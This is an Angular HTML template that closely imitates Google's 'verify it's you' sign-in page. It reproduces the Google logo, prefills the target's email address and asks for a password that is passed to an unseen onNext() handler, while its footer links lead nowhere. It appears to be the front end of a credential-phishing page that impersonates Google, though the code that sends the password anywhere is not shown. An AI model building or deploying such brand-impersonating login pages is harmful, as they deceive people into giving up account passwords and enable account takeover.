<div class="signin-background">
  <div class="signin-card">
    <!-- Left side -->
    <div class="left-side">
      <!-- Google G Logo SVG -->
      <svg class="google-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
        <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
        <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
        <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
        <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
      </svg>
      <h1>Welcome</h1>
      
      <div class="email-container">
        <div class="user-icon">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path fill="#E8EAED" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
          </svg>
        </div>
        <div class="email-text">{{ email }}</div>
      </div>
    </div>
    
    <!-- Right side -->
    <div class="right-side">
      <div class="form-container">
        <p class="verify-text">To continue, first verify it's you</p>
        
        <div class="input-field">
          <input [type]="showPassword ? 'text' : 'password'" 
                 id="password" 
                 [(ngModel)]="password" 
                 required>
          <label for="password">Enter your password</label>
        </div>

        <div class="show-password">
          <input type="checkbox" 
                 id="show-password" 
                 [checked]="showPassword" 
                 (change)="togglePasswordVisibility()">
          <label for="show-password">Show password</label>
        </div>

        <div class="button-row">
          <a href="#" class="forgot-password">Forgot password?</a>
          <button class="next-btn" (click)="onNext()">Next</button>
        </div>
      </div>
    </div>
  </div>

  <div class="modal-footer">
    <div class="language-selector">
      <button class="language-button" (click)="toggleLanguageDropdown()">
        {{ getCurrentLanguage() }}
        <svg class="dropdown-arrow" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
          <path fill="currentColor" d="M7 10l5 5 5-5z"/>
        </svg>
      </button>
      <div class="language-dropdown" *ngIf="showLanguageDropdown">
        <button 
          *ngFor="let language of languages" 
          (click)="selectLanguage(language)"
          [class.selected]="selectedLanguage === language.code"
        >
          {{ language.name }}
        </button>
      </div>
    </div>
    <div class="footer-links">
      <a href="#">Help</a>
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
    </div>
  </div>
</div>
